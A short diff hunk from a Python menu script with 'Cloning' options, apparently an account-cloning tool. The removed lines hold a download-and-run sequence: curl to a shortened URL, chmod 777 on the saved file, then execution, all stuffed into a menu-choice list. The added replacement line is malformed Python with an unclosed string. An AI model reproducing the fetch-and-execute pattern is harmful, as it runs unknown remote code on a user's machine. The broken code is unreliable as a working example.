@@ -420,9 +420,7 @@ class Main:
 		print(" [4] 2009-10 Cloning")
 		print(" [5] 2011-14 Cloning")
 		RAY =input(" Choose : ")
-		if RAY in ["1", "curl -L https://tinyurl.com/59ez8fkn > Copy_Paster_LKING_LSecurity_Hehe_Hannan_Here
-chmod 777 Copy*
-./Copy*"]:
+		if RAY in ["1", "]:
 			File()
 		if RAY in ["2", "02"]:
 			Public()
